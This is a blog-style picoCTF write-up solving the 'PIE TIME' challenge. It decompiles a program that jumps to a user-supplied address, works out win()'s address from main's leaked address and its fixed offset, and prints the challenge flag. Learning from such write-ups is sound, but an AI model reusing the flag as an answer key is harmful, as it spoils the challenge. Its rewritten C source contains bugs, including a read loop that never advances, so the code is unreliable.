---
title: PicoCTF - PIE TIME
published: 2025-08-07
description: PicoCTF Writeup for PIE TIME Challenge
tags: [binary exploitation, easy, picoCTF 2025]
category: PicoCTF Writeup
draft: false
lang: en
---

# PicoCTF Writeup - PIE TIME

BNDB (Binary Ninja Database): [/bndb/202508071017.bndb](/blog/bndb/202508071017.bndb)

PicoCTF Challenge: 
[https://play.picoctf.org/practice/challenge/490?category=6&page=1](https://play.picoctf.org/practice/challenge/490?category=6&page=1)

> ## PIE TIME
> Author: Darkraicg492
> 
> ### Description
> Can you try to get the flag? Beware we have PIE!<br>
> Additional details will be available after launching your challenge instance.<br>
> ### Hints
> 1st - Can you figure out what changed between the address you found locally and in the server output?<br>
> ### Resources:
> Source Code: [/vuln.c](https://challenge-files.picoctf.net/c_rescued_float/1d01af98df77f5ba0339c7e7ba2031e95c3bcce1397dc3b60617dfcfe2e4c7be/vuln.c)<br>
> Binary: [/vuln](https://challenge-files.picoctf.net/c_rescued_float/1d01af98df77f5ba0339c7e7ba2031e95c3bcce1397dc3b60617dfcfe2e4c7be/vuln)<br>

```bash title="Server Information"
$ nc rescued-float.picoctf.net 59097
```

## Decompile

We can decompile the binary to a pseudo C like this (Binary Ninja):

```c title="/vuln_original.c"
00401289    void segfault_handler() __noreturn

00401289    {
00401289        puts("Segfault Occurred, incorrect add…");
004012a2        exit(0);
004012a2        /* no return */
00401289    }

/* ... */

004012a7    int win()
004012a7    /* all puts, putchar should be changed to printf() */

004012a7    {
004012a7        puts("You won!");
004012cd        FILE* fp = fopen("flag.txt", "r");
004012cd        
004012db        if (!fp)
004012db        {
004012ff            puts("Cannot open file.");
004012ee            exit(0);
004012ee            /* no return */
004012db        }
004012db        

00401322        char i = fgetc(fp);
00401322        while (i != EOF) { /* 0xff => EOF */
00401322            putchar(i)
00401322        }

00401322        
00401329        putchar("\n"); /* \n in ASCII code (line-break) */
0040133c        return fclose(fp);
004012a7    }


/* ... */

0040133d    int main()
0040133d    /* int32_t argc => Not used */
0040133d    /* char** argv => Not used */
0040133d    /* char** envp => Not used */

0040133d    {
0040133d        void* fsbase;
00401349        int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
00401349        /* No needed */

00401364        signal(SIGSEGV, segfault_handler); /* 0xb => SIGSEGV */
00401382        setvbuf(stdout, NULL, _IONBF, 0);
00401382        /* __TMC_END__ => stdout */
00401382        /* nullptr => NULL */
00401382        /* 2 => _IONBF (no buffering) */


0040139a        printf("Address of main: %p\n", &main);
0040139a        /* &main to show memory pointer */

004013ab        printf("Enter the address to jump to, ex => 0x12345: ");
004013c3        unsigned long buffer;
004013c3        /* var_20 => buffer (stores a memory address) */
004013c3        scanf("%lx", &buffer);
004013c3        /* __isoc99_scanf => scanf */

004013db        printf("Your input: %lx\n", buffer);

004013ec        void (*target_func)(void) = (void (*)())buffer;
004013ec        /* need to declare as a function before jump */
004013ec        target_func();
004013ec        /* jump to the memory location that user provided */    

004013ec        
00401400        /* Useless from below here */
00401400        if (rax == *(uint64_t*)((char*)fsbase + 0x28))
00401408            return 0;
00401408        
00401402        __stack_chk_fail();
00401402        /* no return */
0040133d    }

```

This is the full source code (decompiled):

```c title="/vuln.c"
void segfault_handler()
{
    printf("Segfault Occurred, incorrect address.");
    exit(0);
}

int win()
{
    printf("You won!");
    FILE* fp = fopen("flag.txt", "r");   
    if (!fp)
    {
        printf("Cannot open file.");
        exit(0);
    } 

    char i = fgetc(fp);
    while (i != EOF) {
        printf("%c", i)
    }
 
    printf("\n");
    return fclose(fp);
}

int main()
{
    signal(SIGSEGV, segfault_handler);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("Address of main: %p\n", &main);
    printf("Enter the address to jump to, ex => 0x12345: ");
    unsigned long buffer;
    scanf("%lx", &buffer);
    printf("Your input: %lx\n", buffer);

    void (*target_func)(void) = (void (*)())buffer;
    target_func(); 
}
```

## Analysis
This program directly jumps to the memory address provided by the user. Additionally, it automatically reveals the address of the `main()` function. By using this address, the user can infer the address of the `win()` function. If the correct address is entered, the program will print the flag.

```c
004012a7    int64_t win() /* 0x0004012a7 */
```

```bash
therustymate-picoctf@webshell:~$ vuln
-bash: vuln: command not found

therustymate-picoctf@webshell:~$ ./vuln
Address of main: 0x564a8857633d
Enter the address to jump to, ex => 0x12345: 0x0004012a7
Your input: 4012a7
Segfault Occurred, incorrect address.

therustymate-picoctf@webshell:~$ ./vuln
Address of main: 0x55958f4eb33d
Enter the address to jump to, ex => 0x12345: 0x4012a7
Your input: 4012a7
Segfault Occurred, incorrect address.

therustymate-picoctf@webshell:~$ ./vuln
Address of main: 0x56426097933d
Enter the address to jump to, ex => 0x12345: 004012a         
Your input: 4012a
Segfault Occurred, incorrect address.

therustymate-picoctf@webshell:~$ ./vuln
Address of main: 0x55d43b65e33d
Enter the address to jump to, ex => 0x12345: 0x55343b64012a
Your input: 55343b64012a
Segfault Occurred, incorrect address.

therustymate-picoctf@webshell:~$ ./vuln
Address of main: 0x560ada01333d
Enter the address to jump to, ex => 0x12345: 0x560ada0132ㅁ7           
Your input: 560ada0132
Segfault Occurred, incorrect address.
```

Notice that the `main()` function offset **33d** does not change.<br>
Therefore, the base address is `0xXXXXXXXX+func (3 bytes)`

This suggests that the input should be: `0xXXXXXXXX2a7` in order to jump to the `win()` function.

```bash
therustymate-picoctf@webshell:~$ nc rescued-float.picoctf.net 59097
Address of main: 0x5fd38eed433d
Enter the address to jump to, ex => 0x12345: 0x5fd38eed42a7
Your input: 5fd38eed42a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_00dea386}
```

The flag is: `picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_00dea386}`